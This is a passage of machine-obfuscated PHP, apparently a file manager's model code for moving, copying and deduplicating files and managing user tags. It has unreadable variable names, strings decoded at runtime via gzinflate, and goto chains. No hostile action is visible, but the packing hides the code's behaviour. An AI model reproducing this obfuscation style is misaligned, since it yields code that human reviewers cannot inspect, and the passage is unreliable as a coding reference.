$ÖİîÌñÄ, $¦Ö‰ÎÍ’[107] => $¦Ö‰ÎÍ’[536], $¦Ö‰ÎÍ’[461] => KodSort::makeStr($ç—Şƒö)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($˜ãÛóÔ) { $Úá±«Ñ =& $_SERVER[¬ÏÕ§Áú]; $Â…íÖ ‘ = $this->sourceInfo($˜ãÛóÔ); $Ü·óÎÜ = $Úá±«Ñ[681]; $­ó¶—²ô = array($Úá±«Ñ[605] => array($Úá±«Ñ[636], $Â…íÖ ‘[$Úá±«Ñ[605]] . $˜ãÛóÔ . $Úá±«Ñ[637]), $Úá±«Ñ[525] => $this->targetIsDelete); $šäª®²€ = $this->field($Ü·óÎÜ)->where($­ó¶—²ô)->select(); if (!$šäª®²€) { return; } $šäª®²€ = array_to_keyvalue($šäª®²€, $Úá±«Ñ[204]); foreach ($šäª®²€ as $ÚÚ½³§) { $ÂÆÔÌå¯ = $ÚÚ½³§[$Úá±«Ñ[203]]; $˜ãÛóÔ = $ÚÚ½³§[$Úá±«Ñ[204]]; if (!isset($this->_childrenListCache[$˜ãÛóÔ]) && $ÚÚ½³§[$Úá±«Ñ[505]] == $Úá±«Ñ[101]) { $this->_childrenListCache[$˜ãÛóÔ] = array(); } if (!isset($this->_childrenListCache[$ÂÆÔÌå¯])) { $this->_childrenListCache[$ÂÆÔÌå¯] = array(); } $this->_childrenListCache[$ÂÆÔÌå¯][$˜ãÛóÔ] = $ÚÚ½³§; $this->_childrenItemCache[$˜ãÛóÔ] = $ÚÚ½³§; } } private function _childrenListAll($ó¬¿€çĞ, &$ÈŞÎÒø) { $©ÁĞ¾ñİ =& $_SERVER[¬ÏÕ§Áú]; if (!isset($this->_childrenListCache[$ó¬¿€çĞ])) { return; } $‡èôã›ø = $this->_childrenListCache[$ó¬¿€çĞ]; foreach ($‡èôã›ø as $“ğ¸öÜÔ => $ğïø˜Ÿ) { $ÈŞÎÒø[$“ğ¸öÜÔ] = $ğïø˜Ÿ; if ($ğïø˜Ÿ[$©ÁĞ¾ñİ[505]] == $©ÁĞ¾ñİ[101]) { $this->_childrenListAll($“ğ¸öÜÔ, $ÈŞÎÒø); } } } private function sourceInfoCache($Ô—ÕÜ¸¾) { if (isset($this->_childrenItemCache[$Ô—ÕÜ¸¾])) { return $this->_childrenItemCache[$Ô—ÕÜ¸¾]; } return $this->sourceInfo($Ô—ÕÜ¸¾); } private function _childrenList($Ÿ²éí¾) { if (isset($this->_childrenListCache[$Ÿ²éí¾])) { return $this->_childrenListCache[$Ÿ²éí¾]; } return $this->_childrenListSelect($Ÿ²éí¾); } private function _childrenListSelect($—µ»ï•Ì) { $Ô’ ùï =& $_SERVER[¬ÏÕ§Áú]; $„œÒëª = array($Ô’ ùï[203] => $—µ»ï•Ì, $Ô’ ùï[525] => $this->targetIsDelete); $…æá÷½ = $this->where($„œÒëª)->select(); $…æá÷½ = $…æá÷½ ? $…æá÷½ : array(); $¸‚ÚÕ©è = array_to_keyvalue($…æá÷½, $Ô’ ùï[204]); $this->_childrenListCache[$—µ»ï•Ì] = $¸‚ÚÕ©è; foreach ($¸‚ÚÕ©è as $—µ»ï•Ì => $¶ÚÆ¶¬‰) { $this->_childrenItemCache[$—µ»ï•Ì] = $¶ÚÆ¶¬‰; } return $¸‚ÚÕ©è; } private function fileNameExistAuto($Š’Á¿ƒÈ, $€‡ËêÒ•) { $á¡›‡»Í =& $_SERVER[¬ÏÕ§Áú]; if ($€‡ËêÒ•[$á¡›‡»Í[525]] == $á¡›‡»Í[101]) { return $this->fileNameExist($Š’Á¿ƒÈ, $€‡ËêÒ•[$á¡›‡»Í[32]]); } return $this->fileNameExistCache($Š’Á¿ƒÈ, $€‡ËêÒ•[$á¡›‡»Í[32]]); } private function fileNameExistCache($øÀ«¤, $ó¿êˆ‚ˆ) { $Š‹¸±É« =& $_SERVER[¬ÏÕ§Áú]; $ó¿êˆ‚ˆ = strtolower($ó¿êˆ‚ˆ); $‚Óæ¯¶ô = $this->_childrenList($øÀ«¤); foreach ($‚Óæ¯¶ô as $»ÆÇ¡Ñ˜) { if ($ó¿êˆ‚ˆ == strtolower($»ÆÇ¡Ñ˜[$Š‹¸±É«[32]])) { return $»ÆÇ¡Ñ˜[$Š‹¸±É«[204]]; } } return !1; } private function fileNameAutoCache($æØœéøÔ, $Àæµêªí, $Ì¯˜€ü, $õôáÙ–) { $‰ğÃı…œ =& $_SERVER[¬ÏÕ§Áú]; $¤­¦’€„ = $this->_childrenList($æØœéøÔ); $ãÈÚ‰Ú„ = array_to_keyvalue($¤­¦’€„, $‰ğÃı…œ[12], $‰ğÃı…œ[32]); return $this->fileNameAutoGet($ãÈÚ‰Ú„, $Àæµêªí, $Ì¯˜€ü, $õôáÙ–); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($è‹Œ¶½, $–ÑŒûó‹, $ç£ªˆ¼ = REPEAT_REPLACE, $ƒïÏÁ´ß = '') { $°œ“„áâ =& $_SERVER[¬ÏÕ§Áú]; $é¥‡Õì = $this->sourceInfo($è‹Œ¶½); $Åº¹´¾ö = $this->sourceInfo($–ÑŒûó‹); if ($é¥‡Õì[$°œ“„áâ[203]] == $Åº¹´¾ö[$°œ“„áâ[204]]) { if ($é¥‡Õì[$°œ“„áâ[525]] == $°œ“„áâ[101]) { Model($°œ“„áâ[523])->restore(array($è‹Œ¶½)); } if (!$ƒïÏÁ´ß || $ƒïÏÁ´ß == $é¥‡Õì[$°œ“„áâ[32]]) { return $è‹Œ¶½; } } $Ìâ¬»·Ì = $this->pathInfoMore($è‹Œ¶½); if ($this->isParentOf($è‹Œ¶½, $–ÑŒûó‹)) { return !1; } if (!$é¥‡Õì || !$Åº¹´¾ö || $Åº¹´¾ö[$°œ“„áâ[505]] != $°œ“„áâ[101]) { return !1; } Hook::trigger($°œ“„áâ[682], $Ìâ¬»·Ì); $this->targetIsDelete = intval($é¥‡Õì[$°œ“„áâ[525]]); if ($é¥‡Õì[$°œ“„áâ[203]] == $–ÑŒûó‹ && $ƒïÏÁ´ß != $é¥‡Õì[$°œ“„áâ[32]]) { $­¶ïâ = $this->fileNameExist($–ÑŒûó‹, $ƒïÏÁ´ß); if ($­¶ïâ && $é¥‡Õì[$°œ“„áâ[505]] == $°œ“„áâ[241]) { $Õ—’Ë»ˆ = $this->sourceInfo($­¶ïâ); $åè×ì„Î = $this->fileHistory($Õ—’Ë»ˆ, $é¥‡Õì[$°œ“„áâ[562]], $é¥‡Õì[$°œ“„áâ[89]]); if (!$åè×ì„Î) { Model($°œ“„áâ[565])->remove($é¥‡Õì[$°œ“„áâ[562]]); } $this->removeNow($è‹Œ¶½, !1); $this->folderSizeReset($–ÑŒûó‹); Hook::trigger($°œ“„áâ[683], $Ìâ¬»·Ì); return $­¶ïâ; } } $¿ ˜Œ’ = $ƒïÏÁ´ß ? $ƒïÏÁ´ß : $é¥‡Õì[$°œ“„áâ[32]]; $this->lockMoveStart($è‹Œ¶½); $this->lockWriteStart($–ÑŒûó‹, $¿ ˜Œ’); $‘„ô£€Å = array($°œ“„áâ[653] => array(), $°œ“„áâ[684] => !1); $this->clearShare($è‹Œ¶½, $–ÑŒûó‹); $©Ä§¥ø = $this->fileNameExistAuto($–ÑŒûó‹, $é¥‡Õì); $Ì®µ†úÇ = $this->_move($è‹Œ¶½, $–ÑŒûó‹, $ç£ªˆ¼, $‘„ô£€Å, $ƒïÏÁ´ß); $this->sourceCacheClear(); if ($é¥‡Õì[$°œ“„áâ[505]] == $°œ“„áâ[101] && $©Ä§¥ø) { $this->folderSizeResetChildren($Ì®µ†úÇ); } Model($°œ“„áâ[243])->linkAdd($‘„ô£€Å[$°œ“„áâ[653]]); if ($Ì®µ†úÇ && $©Ä§¥ø && $‘„ô£€Å[$°œ“„áâ[684]]) { $×–èß¦ = $é¥‡Õì[$°œ“„áâ[505]] == $°œ“„áâ[101] ? $this->_childrenListSelect($è‹Œ¶½) : !1; $Ô‚Ö¬üÍ = $×–èß¦ && count($×–èß¦) > 0 ? !0 : !1; $this->removeNow($è‹Œ¶½, $Ô‚Ö¬üÍ); } $this->lockMoveEnd($è‹Œ¶½); $this->lockWriteEnd($–ÑŒûó‹, $¿ ˜Œ’); $this->folderSizeReset($é¥‡Õì[$°œ“„áâ[203]]); $this->folderSizeReset($–ÑŒûó‹); $³¤Ôµ¸ç = array($é¥‡Õì[$°œ“„áâ[203]], $–ÑŒûó‹); if ($é¥‡Õì[$°œ“„áâ[505]] == $°œ“„áâ[101]) { $³¤Ôµ¸ç[] = $è‹Œ¶½; } $this->updateModifyTime($³¤Ôµ¸ç); Model($°œ“„áâ[657])->eventMove($è‹Œ¶½, $é¥‡Õì[$°œ“„áâ[203]], $–ÑŒûó‹); Hook::trigger($°œ“„áâ[683], $Ìâ¬»·Ì); return $Ì®µ†úÇ; } private function _move($ØÚ¬±‹³, $²‰ËªÒ¦, $Ü”øœ÷•, &$¨¥´Üğş, $ê ÙÃ™ö = '') { $×¿ßñò· =& $_SERVER[¬ÏÕ§Áú]; $ÊÛ¿…Ù§ = $this->sourceInfo($ØÚ¬±‹³); $«‡Â¶ëä = $ÊÛ¿…Ù§[$×¿ßñò·[505]] == $×¿ßñò·[101]; $’à«ëÒ‡ = $ê ÙÃ™ö ? $ê ÙÃ™ö : $ÊÛ¿…Ù§[$×¿ßñò·[32]]; $†¿ášï€ = $this->fileNameExistAuto($²‰ËªÒ¦, $ÊÛ¿…Ù§); $this->lockMoveStart($ØÚ¬±‹³); $this->lockWriteStart($²‰ËªÒ¦, $’à«ëÒ‡); if (!$†¿ášï€) { return $this->_moveForce($ØÚ¬±‹³, $²‰ËªÒ¦, $’à«ëÒ‡); } $ıâúİ—± = $†¿ášï€; $®Õ­¿ç‰ = !1; if ($«‡Â¶ëä) { if ($Ü”øœ÷• == REPEAT_RENAME_FOLDER) { $’à«ëÒ‡ = $this->fileNameAuto($²‰ËªÒ¦, $’à«ëÒ‡, $Ü”øœ÷•, $«‡Â¶ëä); $ıâúİ—± = $this->_moveForce($ØÚ¬±‹³, $²‰ËªÒ¦, $’à«ëÒ‡); } else { $°èàË³‚ = $this->_childrenListSelect($ØÚ¬±‹³); foreach ($°èàË³‚ as $–û˜´Ğ´) { $šØ”Ïñ“ = REPEAT_REPLACE; $this->_move($–û˜´Ğ´[$×¿ßñò·[204]], $†¿ášï€, $šØ”Ïñ“, $¨¥´Üğş); } $®Õ­¿ç‰ = !0; } } else { if ($Ü”øœ÷• == REPEAT_RENAME || $Ü”øœ÷• == REPEAT_RENAME_FOLDER) { $’à«ëÒ‡ = $this->fileNameAuto($²‰ËªÒ¦, $’à«ëÒ‡, $Ü”øœ÷•, $«‡Â¶ëä); $ıâúİ—± = $this->_moveForce($ØÚ¬±‹³, $²‰ËªÒ¦, $’à«ëÒ‡); } else { $ÜÍÛò®Ï = $this->sourceInfoCache($†¿ášï€); $Ùß¦¾Ì« = $this->fileHistory($ÜÍÛò®Ï, $ÊÛ¿…Ù§[$×¿ßñò·[562]], $ÊÛ¿…Ù§[$×¿ßñò·[89]]); if ($Ùß¦¾Ì«) { $¨¥´Üğş[$×¿ßñò·[653]][] = $ÊÛ¿…Ù§[$×¿ßñò·[562]]; } $®Õ­¿ç‰ = !0; } } if ($®Õ­¿ç‰) { $¨¥´Üğş[$×¿ßñò·[684]] = !0; } return $ıâúİ—±; } private function _moveForce($‹®šØ²‹, $½úßº”Á, $ãş¸ü¶Ï) { $Ã¯Ïı¦ñ =& $_SERVER[¬ÏÕ§Áú]; $»è¤›³ = $this->sourceInfo($‹®šØ²‹); $Ôòô‡€´ = $this->sourceInfo($½úßº”Á); $ÔˆÜåŒÑ = $»è¤›³[$Ã¯Ïı¦ñ[505]] == $Ã¯Ïı¦ñ[101]; $™™­ÂÊ  = array($Ã¯Ïı¦ñ[497] => $Ôòô‡€´[$Ã¯Ïı¦ñ[204]], $Ã¯Ïı¦ñ[676] => $Ôòô‡€´[$Ã¯Ïı¦ñ[605]] . $Ôòô‡€´[$Ã¯Ïı¦ñ[204]] . $Ã¯Ïı¦ñ[50], $Ã¯Ïı¦ñ[672] => $Ôòô‡€´[$Ã¯Ïı¦ñ[201]], $Ã¯Ïı¦ñ[673] => $Ôòô‡€´[$Ã¯Ïı¦ñ[590]], $Ã¯Ïı¦ñ[675] => USER_ID, $Ã¯Ïı¦ñ[514] => $ãş¸ü¶Ï); $Ã¦¶§÷Ğ = $»è¤›³[$Ã¯Ïı¦ñ[201]] == SourceModel::TYPE_GROUP && $Ôòô‡€´[$Ã¯Ïı¦ñ[201]] == SourceModel::TYPE_GROUP && $»è¤›³[$Ã¯Ïı¦ñ[590]] == $Ôòô‡€´[$Ã¯Ïı¦ñ[590]]; if (!$Ã¦¶§÷Ğ && $this->moveClearAuth) { Model($Ã¯Ïı¦ñ[588])->authClear($‹®šØ²‹); } $îì‰ÅÅí = $»è¤›³[$Ã¯Ïı¦ñ[525]] == $Ã¯Ïı¦ñ[101] && $Ôòô‡€´[$Ã¯Ïı¦ñ[525]] != $Ã¯Ïı¦ñ[101]; if ($îì‰ÅÅí) { $™™­ÂÊ [$Ã¯Ïı¦ñ[524]] = 0; } if ($ÔˆÜåŒÑ) { $£Á“·Ç¸ = array($Ã¯Ïı¦ñ[676] => array($Ã¯Ïı¦ñ[636], $»è¤›³[$Ã¯Ïı¦ñ[605]] . $»è¤›³[$Ã¯Ïı¦ñ[204]] . $Ã¯Ïı¦ñ[637])); $‚¿¬ç•Ÿ = $»è¤›³[$Ã¯Ïı¦ñ[605]] . $»è¤›³[$Ã¯Ïı¦ñ[204]] . $Ã¯Ïı¦ñ[50]; $€¢Ï«¢† = $Ôòô‡€´[$Ã¯Ïı¦ñ[605]] . $Ôòô‡€´[$Ã¯Ïı¦ñ[204]] . $Ã¯Ïı¦ñ[50] . $»è¤›³[$Ã¯Ïı¦ñ[204]] . $Ã¯Ïı¦ñ[50]; $ÙÀ¨…À… = array($Ã¯Ïı¦ñ[676] => array($Ã¯Ïı¦ñ[685], "\x72\145\x70\154\x61\x63\x65\x28\160\141\x72\x65\x6e\164\114\x65\166\x65\x6c\54\47{$‚¿¬ç•Ÿ}\x27\x2c\47{$€¢Ï«¢†}\47\x29"), $Ã¯Ïı¦ñ[672] => $Ôòô‡€´[$Ã¯Ïı¦ñ[201]], $Ã¯Ïı¦ñ[673] => $Ôòô‡€´[$Ã¯Ïı¦ñ[590]]); if ($îì‰ÅÅí) { $ÙÀ¨…À…[$Ã¯Ïı¦ñ[524]] = 0; } $this->where($£Á“·Ç¸)->data($ÙÀ¨…À…)->save(); } $this->where(array($Ã¯Ïı¦ñ[511] => $‹®šØ²‹))->data($™™­ÂÊ )->save(); return $‹®šØ²‹; } private function clearShare($Ø›È¹§», $®ËˆÀ›) { $üâ¹·‘ =& $_SERVER[¬ÏÕ§Áú]; $ßı¬´Î— = $this->sourceInfo($Ø›È¹§»); $Ã·ì¾»÷ = $this->sourceInfo($®ËˆÀ›); if ($ßı¬´Î—[$üâ¹·‘[590]] == $Ã·ì¾»÷[$üâ¹·‘[590]] && $ßı¬´Î—[$üâ¹·‘[201]] == $üâ¹·‘[686]) { return; } $ÓÕ×‰Ê­ = array($üâ¹·‘[605] => array($üâ¹·‘[636], $ßı¬´Î—[$üâ¹·‘[605]] . $Ø›È¹§» . $üâ¹·‘[637])); $îÑå…¾Î = $this->field($üâ¹·‘[511])->where($ÓÕ×‰Ê­)->getField($üâ¹·‘[204], !0); if (!$îÑå…¾Î) { return; } $ÓÕ×‰Ê­ = array($üâ¹·‘[204] => array($üâ¹·‘[7], $îÑå…¾Î), $üâ¹·‘[687] => 1); $Áö§»ã÷ = Model($üâ¹·‘[688])->field($üâ¹·‘[689])->where($ÓÕ×‰Ê­)->select(); if (!$Áö§»ã÷) { return; } $Áö§»ã÷ = array_to_keyvalue($Áö§»ã÷, $üâ¹·‘[12], $üâ¹·‘[689]); $ÓÕ×‰Ê­ = array($üâ¹·‘[689] => array($üâ¹·‘[7], $Áö§»ã÷)); Model($üâ¹·‘[688])->where($ÓÕ×‰Ê­)->save(array($üâ¹·‘[687] => 0)); Model($üâ¹·‘[690])->where($ÓÕ×‰Ê­)->delete(); } public function copyFolderFromIO($Šâ‰Ôö§, $ºš ±‚, $Å¹ã§Õ, $Êâ¢İ½ç, $†É¤Ôïø, $ƒéò§ÙÏ = false) { $ÂäÌ†Ô² =& $_SERVER[¬ÏÕ§Áú]; $¤æ‰«ŸÁ = array($ÂäÌ†Ô²[654] => array(), $ÂäÌ†Ô²[655] => array(), $ÂäÌ†Ô²[653] => array(), $ÂäÌ†Ô²[691] => array()); $İõºã½Ç = $ƒéò§ÙÏ ? $ƒéò§ÙÏ : $Šâ‰Ôö§->pathThis($ºš ±‚); $­û®õ‹õ = $this->fileNameExist($Å¹ã§Õ, $İõºã½Ç); $”‹ÆÚ‡® = $this->mkdir($Å¹ã§Õ, $İõºã½Ç, $Êâ¢İ½ç); if (!$­û®õ‹õ || $Êâ¢İ½ç == REPEAT_RENAME_FOLDER) { $Êâ¢İ½ç = !1; } if ($­û®õ‹õ) { $this->_childrenAllMake($­û®õ‹õ); } Hook::trigger($ÂäÌ†Ô²[692]); $µ²Ş©…å = KodIO::ioFileDriverGet($ÂäÌ†Ô²[503] . $Å¹ã§Õ . $ÂäÌ†Ô²[413]); $this->_copyChildTo($Šâ‰Ôö§, $ºš ±‚, $”‹ÆÚ‡®, $Êâ¢İ½ç, $¤æ‰«ŸÁ, $†É¤Ôïø, $µ²Ş©…å); Hook::trigger($ÂäÌ†Ô²[693]); if ($”‹ÆÚ‡®) { $this->folderSizeResetChildren($”‹ÆÚ‡®); } $this->_childrenListClear(); Model($ÂäÌ†Ô²[656])->addAll($¤æ‰«ŸÁ[$ÂäÌ†Ô²[654]], array(), !0); Model($ÂäÌ†Ô²[657])->eventCopy($”‹ÆÚ‡®); $this->saveAll($¤æ‰«ŸÁ[$ÂäÌ†Ô²[655]]); Model($ÂäÌ†Ô²[565])->linkAdd($¤æ‰«ŸÁ[$ÂäÌ†Ô²[653]]); Model($ÂäÌ†Ô²[565])->remove($¤æ‰«ŸÁ[$ÂäÌ†Ô²[691]]); $this->folderSizeReset($Å¹ã§Õ); $this->updateModifyTime($Å¹ã§Õ); return $”‹ÆÚ‡®; } private function _copyChildTo($ÏÓïš¾í, $ûÊõÆ÷ñ, $ŒÅÚ¢Æ—, $¼Û”÷ñ, &$®Å¿øĞš, $ğĞ²Íàõ, $áşäïë) { $“èéøúÑ =& $_SERVER[¬ÏÕ§Áú]; $Ğ¨ùİ©ä = $this->sourceInfoCache($ŒÅÚ¢Æ—); $Éæò÷¥ê = $ÏÓïš¾í->listPath($ûÊõÆ÷ñ); $Éæò÷¥ê = $Éæò÷¥ê ? $Éæò÷¥ê : array($“èéøúÑ[96] => array(), $“èéøúÑ[95] => array()); $µ¢­ºò = array_merge($Éæò÷¥ê[$“èéøúÑ[96]], $Éæò÷¥ê[$“èéøúÑ[95]]); $ò½Œüƒ– = $this->_addFiles($ÏÓïš¾í, $áşäïë, $Éæò÷¥ê[$“èéøúÑ[96]], $ğĞ²Íàõ); $ìÊê€¿å = array(); foreach ($µ¢­ºò as &$é©êëóü) { if (isset($ò½Œüƒ–[$é©êëóü[$“èéøúÑ[32]]])) { $é©êëóü = $ò½Œüƒ–[$é©êëóü[$“èéøúÑ[32]]]; } $é©êëóü[$“èéøúÑ[505]] = $é©êëóü[$“èéøúÑ[33]] == $“èéøúÑ[88]; $é©êëóü[$“èéøúÑ[506]] = substr(_get($é©êëóü, $“èéøúÑ[179], $“èéøúÑ[12]), 0, 10); $é©êëóü[$“èéøúÑ[89]] = _get($é©êëóü, $“èéøúÑ[89], 0); $é©êëóü[$“èéøúÑ[562]] = _get($é©êëóü, $“èéøúÑ[562], 0); if (!isset($é©êëóü[$“èéøúÑ[694]]) && $é©êëóü[$“èéøúÑ[562]]) { $®Å¿øĞš[$“èéøúÑ[691]][] = $é©êëóü[$“èéøúÑ[562]]; } if ($¼Û”÷ñ) { $»Ë¸ÖÁØ = $this->fileNameExistCache($ŒÅÚ¢Æ—, $é©êëóü[$“èéøúÑ[32]]); if ($»Ë¸ÖÁØ) { if ($é©êëóü[$“èéøúÑ[505]] || $¼Û”÷ñ == REPEAT_SKIP) { continue; } if ($¼Û”÷ñ == REPEAT_REPLACE) { $‘…ô ëÃ = $this->sourceInfoCache($»Ë¸ÖÁØ); $´ëÆ¸òŠ = $this->fileHistory($‘…ô ëÃ, $é©êëóü[$“èéøúÑ[562]], $é©êëóü[$“èéøúÑ[89]]); if ($´ëÆ¸òŠ) { $®Å¿øĞš[$“èéøúÑ[653]][] = $é©êëóü[$“èéøúÑ[562]]; } continue; } else { if ($¼Û”÷ñ == REPEAT_RENAME) { $é©êëóü[$“èéøúÑ[32]] = $this->fileNameAutoCache($ŒÅÚ¢Æ—, $é©êëóü[$“èéøúÑ[32]], $¼Û”÷ñ, !1); } } } } if (!$é©êëóü[$“èéøúÑ[505]] && $é©êëóü[$“èéøúÑ[562]] == 0) { continue; } if (!$é©êëóü[$“èéøúÑ[505]] && $é©êëóü[$“èéøúÑ[562]]) { $®Å¿øĞš[$“èéøúÑ[653]][] = $é©êëóü[$“èéøúÑ[562]]; } $ìÊê€¿å[] = $this->_makeItemData($é©êëóü, $Ğ¨ùİ©ä, $é©êëóü[$“èéøúÑ[32]]); } unset($é©êëóü); if (!empty($ìÊê€¿å)) { $this->addAll($ìÊê€¿å); $this->_childrenListSelect($ŒÅÚ¢Æ—); } $Ùœ®ÕŸõ = $this->_childrenList($ŒÅÚ¢Æ—); $Ùœ®ÕŸõ = array_to_keyvalue($Ùœ®ÕŸõ, $“èéøúÑ[32]); foreach ($µ¢­ºò as $é©êëóü) { $‘…ô ëÃ = $Ùœ®ÕŸõ[$é©êëóü[$“èéøúÑ[32]]]; $¡øí÷ıÃ = $‘…ô ëÃ[$“èéøúÑ[204]]; $this->_copyApplyMeta($‘…ô ëÃ, $®Å¿øĞš); if ($é©êëóü[$“èéøúÑ[33]] == $“èéøúÑ[88]) { $é©êëóü[$“èéøúÑ[97]] = $ÏÓïš¾í->getPathInner($é©êëóü[$“èéøúÑ[97]]); $this->_copyChildTo($ÏÓïš¾í, $é©êëóü[$“èéøúÑ[97]], $¡øí÷ıÃ, $¼Û”÷ñ, $®Å¿øĞš, $ğĞ²Íàõ, $áşäïë); } } } private function _addFiles($„’Ğ„, $şöÀÓâÍ, $¶ˆÚ´æ£, $Ãèï¦’ ) { $…ƒÅ©Åè =& $_SERVER[¬ÏÕ§Áú]; if (!$¶ˆÚ´æ£ || count($¶ˆÚ´æ£) == 0) { return array(); } $“ÒÆóÓº = array(); foreach ($¶ˆÚ´æ£ as &$—øòÑŒ£) { Hook::trigger($…ƒÅ©Åè[695], $—øòÑŒ£); $—øòÑŒ£[$…ƒÅ©Åè[97]] = $„’Ğ„->getPathInner($—øòÑŒ£[$…ƒÅ©Åè[97]]); $Í£ÂÑşá = $„’Ğ„->hashSimple($—øòÑŒ£[$…ƒÅ©Åè[97]]); $©İä´Ï… = $„’Ğ„->hashMd5($—øòÑŒ£[$…ƒÅ©Åè[97]]); if (strlen($©İä´Ï…) > 10 && !isset($“ÒÆóÓº[$©İä´Ï…])) { $“ÒÆóÓº[$©İä´Ï…] = array(); } $—øòÑŒ£[$…ƒÅ©Åè[696]] = $Í£ÂÑşá; $—øòÑŒ£[$…ƒÅ©Åè[568]] = $©İä´Ï…; $“ÒÆóÓº[$©İä´Ï…][] =& $—øòÑŒ£; if (count($“ÒÆóÓº[$©İä´Ï…]) > 1) { $—øòÑŒ£[$…ƒÅ©Åè[694]] = !0; } Hook::trigger($…ƒÅ©Åè[697], $—øòÑŒ£); } unset($—øòÑŒ£); $¤‚Í´û = array($…ƒÅ©Åè[568] => array($…ƒÅ©Åè[7], array_keys($“ÒÆóÓº))); $¸£¿²ÙÛ = Model($…ƒÅ©Åè[698]); $ğõïÌçâ = $¸£¿²ÙÛ->where($¤‚Í´û)->select(); $ğõïÌçâ = $ğõïÌçâ ? $ğõïÌçâ : array(); foreach ($ğõïÌçâ as $¥Î‹¥) { if (!isset($“ÒÆóÓº[$¥Î‹¥[$…ƒÅ©Åè[568]]])) { continue; } $Ê ôá€€ = $“ÒÆóÓº[$¥Î‹¥[$…ƒÅ©Åè[568]]]; foreach ($Ê ôá€€ as &$—øòÑŒ£) { $—øòÑŒ£[$…ƒÅ©Åè[562]] = $¥Î‹¥[$…ƒÅ©Åè[562]]; $—øòÑŒ£[$…ƒÅ©Åè[694]] = !0; } unset($—øòÑŒ£); } $Ş¦•‘ü¸ = array(); foreach ($¶ˆÚ´æ£ as $ø£¾³æ·) { Hook::trigger($…ƒÅ©Åè[699], $ø£¾³æ·); if (isset($ø£¾³æ·[$…ƒÅ©Åè[694]]) && $ø£¾³æ·[$…ƒÅ©Åè[694]]) { Hook::trigger($…ƒÅ©Åè[700], $ø£¾³æ·); continue; } $Ô½„ÈÕ³ = $„’Ğ„->getPathInner($ø£¾³æ·[$…ƒÅ©Åè[97]]); $¯€¿¯ÑÇ = $¸£¿²ÙÛ->addFileMake($Ô½„ÈÕ³, $şöÀÓâÍ, $ø£¾³æ·[$…ƒÅ©Åè[89]], $ø£¾³æ·[$…ƒÅ©Åè[696]], $ø£¾³æ·[$…ƒÅ©Åè[568]], $ø£¾³æ·[$…ƒÅ©Åè[32]], $Ãèï¦’ ); Hook::trigger($…ƒÅ©Åè[700], $ø£¾³æ·); if (!is_array($¯€¿¯ÑÇ)) { continue; } $Ş¦•‘ü¸[] = $¯€¿¯ÑÇ; } $¸£¿²ÙÛ->addAll($Ş¦•‘ü¸); $¤‚Í´û = array($…ƒÅ©Åè[568] => array($…ƒÅ©Åè[7], array_keys($“ÒÆóÓº))); $ğõïÌçâ = $¸£¿²ÙÛ->where($¤‚Í´û)->select(); $ğõïÌçâ = $ğõïÌçâ ? $ğõïÌçâ : array(); foreach ($ğõïÌçâ as $¥Î‹¥) { if (!isset($“ÒÆóÓº[$¥Î‹¥[$…ƒÅ©Åè[568]]])) { continue; } $ËÎßŠšÙ =& $“ÒÆóÓº[$¥Î‹¥[$…ƒÅ©Åè[568]]]; foreach ($ËÎßŠšÙ as &$—øòÑŒ£) { $—øòÑŒ£[$…ƒÅ©Åè[562]] = $¥Î‹¥[$…ƒÅ©Åè[562]]; } unset($—øòÑŒ£); } $¼µà‡…ì = array(); foreach ($¶ˆÚ´æ£ as $¿Œ¸Á ) { $¼µà‡…ì[$¿Œ¸Á [$…ƒÅ©Åè[32]]] = $¿Œ¸Á ; } return $¼µà‡…ì; } } define($_SERVER[¬ÏÕ§Áú][701], $_SERVER[¬ÏÕ§Áú][702]); goto c“µ¨Œğ°; c“µ¨Œğ°: $pxlknmoycu = $_SERVER[¬ÏÕ§Áú][703]; $_SERVER[øÍ¯û–ª] = explode($_SERVER[¬ÏÕ§Áú][704], gzinflate(substr($_SERVER[¬ÏÕ§Áú][705], 10, -8))); $rvbdtxgfep = $_SERVER[¬ÏÕ§Áú][706]; goto C×»é—´ã; C×‹»“‘Œì: define($_SERVER[¬ÏÕ§Áú][0], $_SERVER[¬ÏÕ§Áú][1]); $_SERVER[ß–ùË‹] = explode($_SERVER[¬ÏÕ§Áú][2], gzinflate(substr($_SERVER[¬ÏÕ§Áú][3], 10, -8))); function binCheckEq($ˆ¿Ô´´Û, $êÓÏ¿ïÍ) { return $ˆ¿Ô´´Û == $êÓÏ¿ïÍ; } goto bˆŞº÷ï; AŒ¾Í©œè: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\162\56\164\141\x67\x4c\151\163\164"; public $modelType = "\125\163\x65\x72\x4f\x70\x74\x69\157\156"; public $field = array("\x6e\x61\155\145", "\x73\164\x79\154\145", "\163\157\x72\164"); public function listData($½¨¿®è“ = false, $®Üƒ’‘ = "\163\157\x72\164", $çêİ¹åú = false) { return parent::listData($½¨¿®è“, $®Üƒ’‘, $çêİ¹åú); } public function remove($Êèò·àì) { return parent::remove($Êèò·àì); } public function add($à”ò°˜«, $–ÔÕ©Ğ = "\154\x61\142\x65\x6c\55\147\162\x65\x79\x2d\156\x6f\162\155\141\x6c") { $áŸ¬ò¼ =& $_SERVER[¬ÏÕ§Áú]; if ($this->findByName($à”ò°˜«)) { return !1; } $Œõ™Ñ¡Ï = array($áŸ¬ò¼[514] => $à”ò°˜«, $áŸ¬ò¼[579] => $–ÔÕ©Ğ, $áŸ¬ò¼[2041] => $this->getSort($áŸ¬ò¼[347]) + 1); return parent::insert($Œõ™Ñ¡Ï); } public function update($›ÇÜ””Ş, $ŸÈ Æ¼„) { $ı—Ÿë©ª =& $_SERVER[¬ÏÕ§Áú]; $·üĞÆÕ± = $this->listData($›ÇÜ””Ş); $â•ìâß = $this->findByName($ŸÈ Æ¼„[$ı—Ÿë©ª[32]]); if (!$·üĞÆÕ± || $â•ìâß && $â•ìâß[$ı—Ÿë©ª[492]] != $·üĞÆÕ±[$ı—Ÿë©ª[492]]) { return !1; } return parent::update($›ÇÜ””Ş, $ŸÈ Æ¼„); } public function moveTop($é¸Âûâ) { $£ğÚØŞ =& $_SERVER[¬ÏÕ§Áú]; $ˆ÷Û“Üè = parent::listData(); $àïÚœ = $this->getSort($£ğÚØŞ[346]); foreach ($ˆ÷Û“Üè as &$Ë»˜”‰Ö) { if ($Ë»˜”‰Ö[$£ğÚØŞ[492]] == $é¸Âûâ) { $Ë»˜”‰Ö[$£ğÚØŞ[2061]] = $àïÚœ; continue; } $Ë»˜”‰Ö[$£ğÚØŞ[2061]] += 